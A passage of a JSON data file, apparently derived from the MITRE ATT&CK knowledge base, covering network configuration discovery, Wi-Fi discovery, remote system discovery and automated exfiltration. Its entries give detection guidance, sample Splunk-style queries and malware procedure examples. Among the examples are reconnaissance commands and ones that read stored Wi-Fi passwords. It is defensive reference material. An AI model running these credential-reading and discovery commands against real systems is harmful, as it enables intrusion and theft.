      "GeminiDukecollects information on network settings and Internet proxy settings from the victim.[101]",
      "GoldMaxretrieved a list of the system's network interface after execution.[102]",
      "Gomircollects network information on infected systems such as listing interface names, MAC and IP addresses, and IPv6 addresses.[103]",
      "Gootloadercan use an embedded script to check the IP address of potential victims visiting compromised websites.[104]",
      "Grandoreirocan determine the IP and physical location of the compromised host via IPinfo.[105]",
      "GravityRATcollects the victim IP address, MAC address, as well as the victim account domain name.[106]",
      "Green Lambertcan obtain proxy information from a victim's machine using system environment variables.[107][108]",
      "GrimAgentcan enumerate the IP and domain of a target system.[109]",
      "HAFNIUMhas collected IP information via IPInfo.[110]",
      "HEXANEhas usedPingandtracertfor network discovery.[111]",
      "Higaisausedipconfigto gather network configuration information.[112][113]",
      "HotCroissanthas the ability to identify the IP address of the compromised machine.[114]",
      "Hydraqcreates a backdoor through which remote attackers can retrieve IP addresses of compromised machines.[115][116]",
      "TheIceAppleifconfigmodule can iterate over all network interfaces on the host and retrieve the name, description, MAC address, DNS suffix, DNS servers, gateways, IPv4 addresses, and subnet masks.[117]",
      "IcedIDused theipconfig /allcommand and a batch script to gather network information.[118]",
      "ifconfigcan be used to display adapter configuration on Unix systems, including information for TCP/IP, DNS, and DHCP.",
      "iKittenwill look for the current IP address.[119]",
      "Industroyer’s 61850 payload component enumerates connected network adapters and their corresponding IP addresses.[120]",
      "InvisiMolegathers information on the IP forwarding table, MAC address, configured proxy, and network SSID.[121][122]",
      "ipconfigcan be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP.",
      "Ixesheenumerates the IP address, network proxy settings, and domain name from a victim's system.[123]",
      "J-magiccan compare the host and remote IPs to check if a received packet is from the infected machine.[124]",
      "AJHUHUGITvariant gathers network interface card information.[125]",
      "JPINcan obtain network information, including DNS, IP, and proxies.[126]",
      "jRATcan gather victim internal and external IPs.[127]",
      "Kazuargathers information about network adapters.[128]",
      "Ke3changhas performed local network configuration discovery usingipconfig.[129][130][131]",
      "Kesselhas collected the DNS address of the infected host.[46]",
      "Kevincan collect the MAC address and other information from a victim machine usingipconfig/all.[111]",
      "KeyBoycan determine the public or WAN IP address for the system.[132]",
      "KEYMARBLEgathers the MAC address of the victim’s machine.[133]",
      "Kimsukyhas usedipconfig/alland web beacons sent via email to gather network configuration information.[134][135]",
      "Koadiccan retrieve the contents of the IP routing table as well as information about the Windows domain.[136][137]",
      "Kobaloscan record the IP address of the target machine.[138]",
      "KONNIcan collect the IP address from the victim’s machine.[139]",
      "KOPILUWAKcan useArpto discover a target's network configuration setttings.[140]",
      "KV Botnet Activitygathers victim IP information during initial installation stages.[141]",
      "Kwampirscollects network adapter and interface information by using the commandsipconfig /all,arp -aandroute print. It also collects the system's MAC address withgetmacand domain configuration withnet config workstation.[142]",
      "Latrodectuscan discover the IP and MAC address of a targeted host.[143][144]",
      "Lazarus Groupmalware IndiaIndia obtains and sends to its C2 server information about the first network interface card’s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available.[145][146]",
      "LightNeurongathers information about network adapters using the Win32 API callGetAdaptersInfo.[147]",
      "LiteDukehas the ability to discover the proxy configuration of Firefox and/or Opera.[93]",
      "Lizarcan retrieve network information from a compromised host.[148]",
      "Lokibothas the ability to discover the domain name of the infected host.[149]",
      "Lotus Blossomhas used commands such asipconfigandnetstatto gather network information on compromised hosts.[150]",
      "LoudMinerused a script to gather the IP address of the infected machine before sending to the C2.[151]",
      "Lucifercan collect the IP address of a compromised host.[152]",
      "LunarLoadercan verify the targeted host's DNS name which is then used in the creation of a decyrption key.[153]",
      "LunarWebcan use shell commands to discover network adapters and configuration.[153]",
      "Machetecollects the MAC address of the target computer and other network configuration information.[154][155]",
      "MacMacan collect IP addresses from a compromised host.[156]",
      "Mafaldacan use theGetAdaptersInfofunction to retrieve information about network adapters and theGetIpNetTablefunction to retrieve the IPv4 to physical network address mapping table.[157]",
      "Magic Houndmalware gathers the victim's local IP address, MAC address, and external IP address.[158][159][160]",
      "MagicRATcollects system network information using commands such asipconfig /all.[161]",
      "Manjusakagathers information about current network connections, local and remote addresses associated with them, and associated processes.[162]",
      "menuPasshas used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions.[163]",
      "Milancan runC:\\Windows\\system32\\cmd.exe /c cmd /c ipconfig /all 2>&1to discover network settings.[164]",
      "Mis-Typemay create a file containing the results of the commandcmd.exe /c ipconfig /all.[165]",
      "Moonstone Sleethas gathered information on victim network configuration.[166]",
      "MoonWindobtains the victim IP address.[167]",
      "More_eggshas the capability to gather the IP address from the victim's machine.[168]",
      "Moses Staffhas collected the domain name of a compromised network.[169]",
      "Mosquitouses theipconfigcommand.[170]",
      "MuddyWaterhas used malware to collect the victim’s IP address and domain name.[171]",
      "Mustang Pandahas usedipconfigandarpto determine network configuration information.[172]",
      "Naidcollects the domain name from a compromised host.[173]",
      "Naikonuses commands such asnetsh interface showto discover network interface settings.[174]",
      "NanHaiShucan gather information about the victim proxy server.[175]",
      "NanoCoregathers the IP address from the victim’s machine.[176]",
      "NBTscancan be used to collect MAC addresses.[177][178]",
      "nbtstatcan be used to discover local NetBIOS domain names.",
      "Neoichorcan gather the IP address from an infected host.[131]",
      "NETWIREcan collect the IP address of a compromised host.[179][180]",
      "NGLiteidentifies the victim system MAC and IPv4 addresses and uses these to establish a victim identifier.[181]",
      "Nightdoorgathers information on victim system network configuration such as MAC addresses.[182]",
      "Ninjacan enumerate the IP address on compromised systems.[183]",
      "Nltestmay be used to enumerate the parent domain of a local machine using/parentdomain.[184]",
      "NOKKIcan gather information on the victim IP address.[185]",
      "OceanSaltcan collect the victim’s IP address.[186]",
      "Octopuscan collect the host IP address from the victim’s machine.[187]",
      "OilRighas runipconfig /allon a victim.[188][189]",
      "Okrumcan collect network information, including the host IP address, DNS, and proxy information.[190]",
      "Olympic Destroyeruses API calls to enumerate the infected system's ARP table.[191]",
      "DuringOperation CuckooBees, the threat actors usedipconfig,nbtstat,tracert,route print, andcat /etc/hostscommands.[192]",
      "DuringOperation Wocao, threat actors discovered the local network configuration withipconfig.[193]",
      "Orzcan gather victim proxy information.[175]",
      "OSInfodiscovers the current domain information.[17]",
      "OSX_OCEANLOTUS.Dcan collect the network interface MAC address on the infected host.[194][195]",
      "Pay2Keycan identify the IP and MAC addresses of the compromised host.[196]",
      "PcSharecan obtain the proxy settings of a compromised machine usingInternetQueryOptionAand its IP address by runningnslookup myip.opendns.comresolver1.opendns.com\\r\\n.[99]",
      "Penquincan report the IP of the compromised host to attacker controlled infrastructure.[197]",
      "Pikabotgathers victim network information through commands such asipconfigandipconfig /all.[198]",
      "PingPullcan retrieve the IP address of a compromised host.[199]",
      "PipeMoncan collect and send the local IP address, RDP information, and the network adapter physical address as a part of its C2 beacon.[200]",
      "Pisloaderhas a command to collect the victim's IP address.[201]",
      "PLAINTEEuses theipconfig /allcommand to gather the victim’s IP address.[202]",
      "Playhas used the information-stealing tool Grixba to enumerate network information.[203]",
      "PoshC2can enumerate network adapter information.[204]",
      "PowerDukehas a command to get the victim's domain and NetBIOS name.[205]",
      "PowerShowerhas the ability to identify the current Windows domain of the infected host.[206]",
      "POWERSTATScan retrieve IP, network adapter configuration information, and domain from compromised hosts.[207][208]",
      "POWRUNERmay collect network configuration data by runningipconfig /allon a victim.[209]",
      "A module inPrikormkacollects information from the victim about its IP addresses and MAC addresses.[210]",
      "Proxysvccollects the network adapter information and domain/username information based on current remote sessions.[211]",
      "Pupyhas built in commands to identify a host’s IP address and find out other network configuration settings by viewing connected sessions.[212]",
      "Pysacan perform network reconnaissance using the Advanced IP Scanner tool.[213]",
      "QakBotcan usenet config workstation,arp -a,nslookup, andipconfig /allto gather network configuration information.[214][215][216][217][218]",
      "QUADAGENTgathers the current domain the victim system belongs to.[219]",
      "QuasarRAThas the ability to enumerate the Wide Area Network (WAN) IP through requests to ip-api[.]com, freegeoip[.]net, or api[.]ipify[.]org observed with user-agent stringMozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0.[220]",
      "QUIETCANARYcan identify the default proxy setting on a compromised host.[140]",
      "Ramsaycan useipconfigandArpto collect network configuration information, including routing information and ARP tables.[221]",
      "RATANKBAgathers the victim’s IP address via theipconfig -allcommand.[222][223]",
      "Reavercollects the victim's IP address.[224]",
      "RedLeavescan obtain information about network parameters.[163]",
      "Remseccan obtain information about network configuration, including the routing table, ARP cache, and DNS cache.[225]",
      "Revenge RATcollects the IP address and MAC address from the system.[226]",
      "Rifdoorhas the ability to identify the IP address of the compromised host.[227]",
      "Rising Suncan detect network adapter and IP address information.[228]",
      "RogueRobingathers the IP address and domain from the victim’s machine.[229]",
      "routecan be used to discover routing configuration information.",
      "Royalcan enumerate IP addresses usingGetIpAddrTable.[230]",
      "Ryukhas calledGetIpNetTablein attempt to identify all mounted drives and hosts that have Address Resolution Protocol (ARP) entries.[231][232]",
      "S-Typehas usedipconfig /allon a compromised host.[165]",
      "Sagerunexwill gather system information such as MAC and IP addresses.[150]",
      "Saint Botcan collect the IP address of a victim machine.[233]",
      "Sardonichas the ability to execute theipconfigcommand.[234]",
      "SDBbothas the ability to determine the domain name and whether a proxy is configured on a compromised host.[235]",
      "ShadowPadhas collected the domain name of the victim system.[236]",
      "DuringShadowRay, threat actors invoked DNS queries from targeted machines to identify their IP addresses.[237]",
      "Shamoonobtains the target's IP address and local network segment.[238][239]",
      "SHARPSTATShas the ability to identify the domain of the compromised host.[208]",
      "ShimRatReportergathered the local proxy, domain, IP, routing tables, mac address, gateway, DNS servers, and DHCP status information from an infected host.[240]",
      "ShrinkLockercaptures the IP address of the victim system and sends this to the attacker following encryption.[241]",
      "Sibotchecked if the compromised system is configured to use proxies.[102]",
      "SideCopyhas identified the IP address of a compromised host.[4]",
      "SideTwisthas the ability to collect the domain name on a compromised host.[242]",
      "Sidewinderhas used malware to collect information on network interfaces, including the MAC address.[243]",
      "Sliverhas the ability to gather network configuration information.[244]",
      "Small Sievecan obtain the IP address of a victim host.[245]",
      "SocGholishhas the ability to enumerate the domain name of a victim, as well as if the host is a member of an Active Directory domain.[246][247][248]",
      "SoreFangcan collect the TCP/IP, DNS, DHCP, and network adapter configuration on a compromised host viaipconfig.exe /all.[249]",
      "SpeakUpuses theifconfig -acommand.[250]",
      "SpicyOmelettecan identify the IP of a compromised system.[251]",
      "Squirrelwafflehas collected the victim’s external IP address.[252]",
      "STARWHALEhas the ability to collect the IP address of an infected host.[253]",
      "Stealth Falconmalware gathers the Address Resolution Protocol (ARP) table from the victim.[254]",
      "StrongPitycan identify the IP address of a compromised host.[255]",
      "Stuxnetcollects the IP address of a compromised system.[256]",
      "SUNBURSTcollected all network interface MAC addresses that are up and not loopback devices, as well as IP address, DHCP configuration, and domain information.[257]",
      "Sykipotmay useipconfig /allto gather system network configuration details.[258]",
      "Sys10collects the local IP address of the victim and sends it to the C2.[174]",
      "SysUpdatecan collected the IP address and domain name of a compromised host.[259]",
      "T9000gathers and beacons the MAC and IP addresses during installation.[260]",
      "Taidoorhas collected the MAC address of a compromised host; it can also useGetAdaptersInfoto identify network adapters.[261][262]",
      "TajMahalhas the ability to identify the MAC address on an infected host.[263]",
      "TeamTNThas enumerated the host machine’s IP address.[264]",
      "Threat Group-3390actors useNBTscanto discover vulnerable systems.[265]",
      "Torismacan collect the local MAC address usingGetAdaptersInfoas well as the system's IP address.[266]",
      "TrickBotobtains the IP address, location, and other relevant network information from the victim’s machine.[267][268][63]",
      "Trojan.Karaganycan gather information on the network configuration of a compromised host.[269]",
      "Troll Stealercollects the MAC address of victim devices.[270]",
      "Tropic Trooperhas used scripts to collect the host's network topology.[271]",
      "TSCookiehas the ability to identify the IP of the infected host.[272]",
      "Turiancan retrieve the internal IP address of a compromised host.[273]",
      "Turlasurveys a system upon check-in to discover network configuration details using thearp -a,nbtstat -n,net config,ipconfig /all, androutecommands, as well asNBTscan.[90][274][275]TurlaRPC backdoors have also retrieved registered RPC interface information from process memory.[276]",
      "Unknown Loggercan obtain information about the victim's IP address.[277]",
      "UPPERCUThas the capability to gather the victim's proxy information.[278]",
      "USBferrycan detect the infected machine's network topology usingipconfigandarp.[271]",
      "Valakhas the ability to identify the domain and the MAC and IP addresses of an infected machine.[279]",
      "VERMINgathers the local IP address.[280]",
      "Volgmercan gather the IP address from the victim's machine.[281]",
      "Volt Typhoonhas executed multiple commands to enumerate network topology and settings includingipconfig,netsh interface firewall show all, andnetsh interface portproxy show all.[282]",
      "WannaCrywill attempt to determine the local network segment it is a part of.[283]",
      "WellMailcan identify the IP address of the victim system.[284]",
      "WellMesscan identify the IP address and user domain on the target machine.[285][286]",
      "Wizard Spiderhas usedipconfigto identify the network configuration of a victim machine.Wizard Spiderhas also used the PowerShell cmdletGet-ADComputerto collect IP address data from Active Directory.[287][288]",
      "Woody RATcan retrieve network interface and proxy information.[289]",
      "Xbashcan collect IP addresses and local intranet information from a victim’s machine.[290]",
      "xCaonhas used the GetAdaptersInfo() API call to get the victim's MAC address.[47]",
      "ytyrunsipconfig /alland collects the domain name.[291]",
      "Zebrocyruns theipconfig /allcommand.[292]",
      "ZeroTgathers the victim's IP address and domain information, and then sends it to its C2 server.[293]",
      "ZIRCONIUMhas used a tool to enumerate proxy settings in the target environment.[294]",
      "zwShellcan obtain the victim IP address.[295]"
    ]
  },
  "T1016.001": {
    "Name": "System Network Configuration Discovery:Internet Connection Discovery",
    "Description": "Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as usingPing,tracert, and GET requests to websites.Adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",
    "Detects": [
      "Monitor executed commands and arguments that may check for Internet connectivity on compromised systems.",
      "Monitor for executed processes (such as tracert or ping) that may check for Internet connectivity on compromised systems."
    ],
    "Procedure Examples": [
      "APT29has ensured web servers in a victim environment are Internet accessible before copying tools or malware to it.[1]",
      "DarkTortillacan check for internet connectivity by issuing HTTP GET requests.[2]",
      "FIN13has usedPingandtracertfor network reconnaissance efforts.[3]",
      "FIN8has used thePingcommand to check connectivity to actor-controlled C2 servers.[4]",
      "Gamaredon Grouphas tested connectivity between a compromised machine and a C2 server usingPingwith commands such asCSIDL_SYSTEM\\cmd.exe /c ping -n 1.[5]",
      "GoldFinderperformed HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request traveled through.[6]",
      "HAFNIUMhas checked for network connectivity from a compromised host usingping, including attempts to contactgoogle[.]com.[7]",
      "HEXANEhas used tools includingBITSAdminto test internet connectivity from compromised hosts.[8]",
      "Lotus Blossomhas performed checks to determine if a victim machine is able to access the Internet.[9]",
      "Magic Houndhas conducted a network call out to a specific website as part of their initial discovery activity.[10]",
      "More_eggshas used HTTP GET requests to check internet connectivity.[11]",
      "Neoichorcan check for Internet connectivity by contacting bing[.]com with the request formatbing[.]com?id=<GetTickCount>.[12]",
      "NKAbuseutilizes external services such asifconfig.meto identify the victim machine's IP address.[13]",
      "DuringOperation Wocao, threat actors used a Visual Basic script that checked for internet connectivity.[14]",
      "QakBotcan measure the download speed on a targeted host.[15]",
      "QuietSievecan check C2 connectivity with apingto 8.8.8.8 (Google public DNS).[16]",
      "Rising Suncan test a connection to a specified network IP address over a specified port number.[17]",
      "During theSolarWinds Compromise,APT29usedGoldFinderto perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through.[6]",
      "SUGARUSHhas checked for internet connectivity from an infected host before attempting to establish a new TCP connection.[18]",
      "SysUpdatecan contact the DNS server operated by Google as part of its C2 establishment process.[19]",
      "TA2541has run scripts to check internet connectivity from compromised hosts.[20]",
      "Turlahas usedtracertto check internet connectivity.[21]",
      "Volt Typhoonhas employedPingto check network connectivity.[22]",
      "Woody RATcan makePingGET HTTP requests to its C2 server at regular intervals for network connectivity checks.[23]"
    ]
  },
  "T1016.002": {
    "Name": "System Network Configuration Discovery:Wi-Fi Discovery",
    "Description": "Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part ofAccount Discovery,Remote System Discovery, and other discovery orCredential Accessactivity to support both ongoing and future campaigns.Adversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available throughnetsh wlan show profilesto enumerate Wi-Fi names and thennetsh wlan show profile \"Wi-Fi name\" key=clearto show a Wi-Fi network’s corresponding password.[1][2][3]Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls towlanAPI.dllNative APIfunctions.[4]On Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under/etc/NetworkManager/system-connections/.[5]On macOS, the password of a known Wi-Fi may be identified withsecurity find-generic-password -wa wifiname(requires admin username/password).[6]",
    "Detects": [
      "Monitor executed commands and arguments that may collect Wi-Fi information on compromised systems.",
      "Monitor for API calls (such as those fromwlanAPI.dll) that may gather details about locally reachable Wi-Fi networks."
    ],
    "Procedure Examples": [
      "Agent Teslacan collect names and passwords of all Wi-Fi networks to which a device has previously connected.[7]",
      "DuringAPT28 Nearest Neighbor Campaign,APT28collected information on wireless interfaces within range of a compromised system.[8]",
      "Emotetcan extract names of all locally reachable Wi-Fi networks and then perform a brute-force attack to spread to new networks.[4]",
      "Magic Houndhas collected names and passwords of all Wi-Fi networks to which a device has previously connected.[3]"
    ]
  },
  "T1018": {
    "Name": "Remote System Discovery",
    "Description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such asPing,net viewusingNet, or, on ESXi servers,esxcli network diag ping.Adversaries may also analyze data from local host files (ex:C:\\Windows\\System32\\Drivers\\etc\\hostsor/etc/hosts) or other passive means (such as localArpcache entries) in order to discover the presence of remote systems in an environment.Adversaries may also target discovery of network infrastructure as well as leverageNetwork Device CLIcommands on network devices to gather detailed information about systems within a network (e.g.show cdp neighbors,show arp).[1][2]",
    "Detects": [
      "Monitor executed commands and arguments that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. For network devices, monitor executed commands in AAA logs, especially those run by unexpected or unauthorized users.Windows PowerShell log Event ID 4104 (PS script execution) can be used to capture PowerShell script block contents which may contain commands used as a precursor toRDP Hijacking. For example, the following command in a PowerShell script block may be used to enumerate the systems on a network which have RDP access:Find-DomainLocalGroupMember -GroupName \"Remote Desktop Users\" | select -expand ComputerName.",
      "Monitor for files (such as/etc/hosts) being accessed that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system.For Windows, Event ID 4663 (An Attempt Was Made to Access An Object) can be used to alert on access attempts of local files that store host data, including C:\\Windows\\System32\\Drivers\\etc\\hosts.For Linux, auditing frameworks such as the audit daemon (auditd) can be used to alert on access attempts of local files that store host data, including /etc/hosts.",
      "Monitor for newly constructed network connections associated with pings/scans that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system.",
      "Monitor for newly executed processes that can be used to discover remote systems, such asping.exeandtracert.exe, especially when executed in quick succession.[115]"
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack,Sandworm Teamremotely discovered systems over LAN connections. OT systems were visible from the IT network   as well, giving adversaries the ability to discover operational assets.[3]",
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamchecked for connectivity to resources within the network and used LDAP to query Active Directory, discovering information about computers listed in AD.[4]",
      "AdFindhas the ability to query Active Directory for computers.[5][6][7][8]",
      "Agriusused the toolNBTscanto scan for remote, accessible hosts in victim environments.[9]",
      "Akirauses software such as Advanced IP Scanner and MASSCAN to identify remote hosts within victim networks.[10]",
      "APT3has a tool that can detect the existence of remote systems.[11][12]",
      "APT32has enumerated DC servers using the commandnet group \"Domain Controllers\" /domain. The group has also used thepingcommand.[13]",
      "APT39has usedNBTscanand custom tools to discover remote systems.[14][15][16]",
      "APT41has used MiPing to discover active systems in the victim network.[17]",
      "Arpcan be used to display a host's ARP cache, which may include address resolutions for remote systems.[18][19]",
      "Backdoor.Oldreacan enumerate and map ICS-specific systems in victim environments.[20]",
      "BADHATCHcan use a PowerShell object such as,System.Net.NetworkInformation.Pingto ping a computer.[21]",
      "Bazarcan enumerate remote systems usingNet View.[22]",
      "BitPaymercan usenet viewto discover remote systems.[23]",
      "Black Bastacan use LDAP queries to connect to AD and iterate over connected workstations.[24]",
      "BlackByteused tools such asArpto identify remotely-connected devices.[25][26]",
      "BlackCatcan broadcasts NetBIOS Name Service (NBNC) messages to search for servers connected to compromised networks.[27]",
      "BloodHoundcan enumerate and collect the properties of domain computers, including domain controllers.[28]",
      "BRONZE BUTLERtypically usepingandNetto enumerate systems.[29]",
      "DuringC0015, the threat actors used the commandsnet view /all /domainandpingto discover remote systems. They also used PowerView's PowerShell Invoke-ShareFinder script for file share enumeration.[30]",
      "Carbonuses thenet viewcommand.[31]",
      "Chimerahas utilized various scans and queries to find domain controllers and remote services in the target environment.[32]",
      "Cobalt Strikeuses the native Windows Network Enumeration APIs to interrogate and discover targets in a Windows Active Directory network.[33][34][35]",
      "Comnieruns thenet viewcommand",
      "Contihas the ability to discover hosts on a target network.[36]",
      "CrackMapExeccan discover active IP addresses, along with the machine name, within a targeted network.[37]",
      "Deep Pandahas used ping to identify other machines of interest.[38]",
      "Diavolcan use the ARP table to find remote hosts to scan.[39]",
      "Dragonflyhas likely obtained a list of hosts in the victim environment.[40]",
      "DRATzaruscan search for other machines connected to compromised host and attempt to map the network.[41]",
      "DUSTTRAPcan usepingto identify remote hosts within the victim network.[42]",
      "Earth Luscaused the commandpowershell \"Get-EventLog -LogName security -Newest 500 | where {$_.EventID -eq 4624} | format-list -property * | findstr \"Address\"\"to find the network information of successfully logged-in accounts to discovery addresses of other machines.Earth Luscahas also used multiple scanning tools to discover other machines within the same compromised network.[43]",
      "Ember Bearhas used tools such as Nmap and MASSCAN for remote service discovery.[44]",
      "Epicuses thenet viewcommand on the victim’s machine.[45]",
      "FIN5has used the open source tool Essential NetTools to map the network and build a list of targets.[46]",
      "FIN6used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.[47]",
      "FIN8has useddsqueryand other Active Directory utilities to enumerate hosts; they have also usednltest.exe /dclistto retrieve a list of domain controllers.[48][49]",
      "Flagprohas been used to executenet viewon a targeted system.[50]",
      "Fox Kittenhas used Angry IP Scanner to detect remote systems.[51]",
      "FunnyDreamcan collect information about hosts on the victim network.[52]",
      "DuringFunnyDream, the threat actors used several tools and batch files to map victims' internal networks.[53]",
      "GALLIUMused a modified version ofNBTscanto identify available NetBIOS name servers over the network as well aspingto identify remote systems.[54]",
      "Gomirprobes arbitrary network endpoints for TCP connectivity.[55]",
      "HAFNIUMhas enumerated domain controllers usingnet group \"Domain computers\"andnltest /dclist.[56]",
      "HermeticWizardcan find machines on the local network by gathering known local IP addresses throughDNSGetCacheDataTable,GetIpNetTable,WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY),NetServerEnum,GetTcpTable, andGetAdaptersAddresses.[57]",
      "HEXANEhas usednet viewto enumerate domain machines.[58]",
      "Indrik Spiderhas used PowerView to enumerate all Windows Server, Windows Server 2003, and Windows 7 instances in the Active Directory database.[59]",
      "Industroyercan enumerate remote computers in the compromised network.[60]",
      "Ke3changhas used network scanning and enumeration tools, includingPing.[61]",
      "Kinsinghas used a script to parse files like/etc/hostsand SSHknown_hoststo discover remote systems.[62]",
      "Kwampirscollects a list of available servers with the commandnet view.[63]",
      "Leafminerused Microsoft’s Sysinternals tools to gather detailed information about remote systems.[64]",
      "Leviathanperformed extensive remote host enumeration to build their own map of victim networks duringLeviathan Australian Intrusions.[65]",
      "Lotus Blossomhas usedPingto identify remote systems.[66]",
      "Magic Houndhas usedPingfor discovery on targeted networks.[67]",
      "menuPassuses scripts to enumerate IP ranges on the victim network.menuPasshas also issued the commandnet view /domainto aPlugXimplant to gather information about remote systems on the network.[68][69]",
      "MgBotincludes modules for performing ARP scans of local connected systems.[70]",
      "MURKYTOPhas the capability to identify remote hosts on connected networks.[71]",
      "Naikonhas used a netbios scanner for remote machine identification.[72]",
      "NBTscancan list NetBIOS computer names.[73][74]",
      "Commands such asnet viewcan be used inNetto gather information about available remote systems.[75]",
      "njRATcan identify remote hosts on connected networks.[76]",
      "Nltestmay be used to enumerate remote domain controllers using options such as/dclistand/dsgetdc.[77]",
      "Olympic DestroyerusesWindows Management Instrumentationto enumerate all systems in the network.[78]",
      "DuringOperation CuckooBees, the threat actors used thenet viewandpingcommands as part of their advanced reconnaissance.[79]",
      "DuringOperation Wocao, threat actors usednbtscanandpingto discover remote systems, as well asdsquery subneton a domain controller to retrieve all subnets in the Active Directory.[80]",
      "OSInfoperforms a connection test to discover remote systems in the network[11]",
      "Pingcan be used to identify remote systems within a network.[81]",
      "Playhas used tools such asAdFind,Nltest, andBloodHoundto enumerate shares and hostnames on compromised networks.[82]",
      "PoetRATused Nmap for remote system discovery.[83]",
      "QakBotcan identify remote systems through thenet viewcommand.[84][85][86]",
      "RansomHubcan enumerate all accessible machines from the infected system.[87]",
      "RATANKBAruns thenet view /domainandnet viewcommands.[88]",
      "Remseccan ping or traceroute a remote host.[89]",
      "ROADToolscan enumerate Azure AD systems and devices.[90]",
      "Rockehas looked for IP addresses in the known_hosts file on the infected system and attempted to SSH into them.[91]",
      "Sandworm Teamhas used a tool to query Active Directory using LDAP, discovering information about computers listed in AD.[92][4]",
      "Scattered Spidercan enumerate remote systems, such as VMware vCenter infrastructure.[93]",
      "Shamoonscans the C-class subnet of the IPs on the victim's interfaces.[94]",
      "SHOTPUThas a command to list all servers in the domain, as well as one to locate domain controllers on a domain.[95]",
      "Silencehas used Nmap to scan the corporate network, build a network topology, and identify vulnerable hosts.[96]",
      "SILENTTRINITYcan enumerate and collect the properties of domain computers.[97]",
      "During theSolarWinds Compromise,APT29usedAdFindto enumerate remote systems.[98]",
      "SpicyOmelettecan identify payment systems, payment gateways, and ATM systems in compromised environments.[99]",
      "Sykipotmay usenet view /domainto display hostnames of available systems on a network.[100]",
      "TheTAINTEDSCRIBEcommand and execution module can perform target system enumeration.[101]",
      "Threat Group-3390has used thenet viewcommand.[102]",
      "ToddyCathas usedping %REMOTE_HOST%for post exploit discovery.[103]",
      "TrickBotcan enumerate computers and network devices.[104]",
      "Turlasurveys a system upon check-in to discover remote systems on a local network using thenet viewandnet view /DOMAINcommands.Turlahas also usednet group \"Domain Computers\" /domain,net group \"Domain Controllers\" /domain, andnet group \"Exchange Servers\" /domainto enumerate domain computers, including the organization's DC and Exchange Server.[45][105]",
      "USBferrycan usenet viewto gather information about remote systems.[106]",
      "Volt Typhoonhas used multiple methods, includingPing, to enumerate systems on compromised networks.[107][108]",
      "WannaCryscans its local network segment for remote systems to try to exploit and copy itself to.[109]",
      "Wizard Spiderhas used networkdll for network discovery and psfin specifically for financial and point of sale indicators.Wizard Spiderhas also usedAdFind,nltest/dclist, and PowerShell script Get-DataInfo.ps1 to enumerate domain computers, including the domain controller.[7][110][111][5][112][113]",
      "ytyuses thenet viewcommand for discovery.[114]"
    ]
  },
  "T1020": {
    "Name": "Automated Exfiltration",
    "Description": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.[1]When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such asExfiltration Over C2 ChannelandExfiltration Over Alternative Protocol.",
    "Detects": [
      "Monitor execution of exfiltration-related commands such as scp, rsync, curl, ftp, wget, command-line utilities used to archive and move data (tar, zip, 7z), suspicious execution of scripts performing batch file transfers, or unusual usage of PowerShell, Bash, or Python for bulk file movement.Analytic 1 - Detecting Automated File Exfiltration Commands(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (command IN (\"scp\", \"rsync\", \"curl\", \"ftp\", \"wget\", \"powershell -enc\", \"tar -cf\", \"zip -r\", \"7z a\"))| eval risk_score=case(    command IN (\"scp\", \"rsync\", \"curl\"), 9,    command IN (\"tar -cf\", \"zip -r\"), 8,    command IN (\"powershell -enc\", \"wget\"), 7)| where risk_score >= 8| stats count by _time, host, user, command, risk_score",
      "Monitor for abnormal access to files (i.e. .pdf, .docx, .jpg, etc.), especially sensitive documents, through the use of automated processing after being gathered during Collection.Analytic 1 - Detecting File Access Before Automated Exfiltration(EventCode=11 OR EventCode=4663 OR source=\"/var/log/audit/audit.log\" type=\"open\")| where (file_path IN (\"/var/tmp/\", \"/home//Downloads/\", \"/media/exfil/\", \"C:\\Users\\\\Documents\\exfil\"))| eval risk_score=case(    file_path IN (\"/media/exfil/\"), 9,    file_path IN (\"/var/tmp/*\"), 8)| where risk_score >= 8| stats count by _time, host, user, file_path, risk_score",
      "Monitor for newly constructed network connections associated with processes performing collection activity, especially those involving abnormal/untrusted hosts.Analytic 1 - Detecting Automated Exfiltration via Network(EventCode=3)OR (source=\"zeek_conn.log\" dest_port IN (21, 22, 443, 53) AND bytes_out > 5000000)OR (source=\"firewall_logs\" bytes_out > 10000000)| eval risk_score=case(    bytes_out > 10000000, 9,    bytes_out > 5000000, 8)| where risk_score >= 8| stats count by _time, host, user, dest_ip, dest_port, bytes_out, risk_score",
      "Monitor network traffic content for evidence of data exfiltration, such as gratuitous or anomalous outbound traffic containing collected data. Consider correlation with process monitoring and command lines associated with collection and exfiltration.",
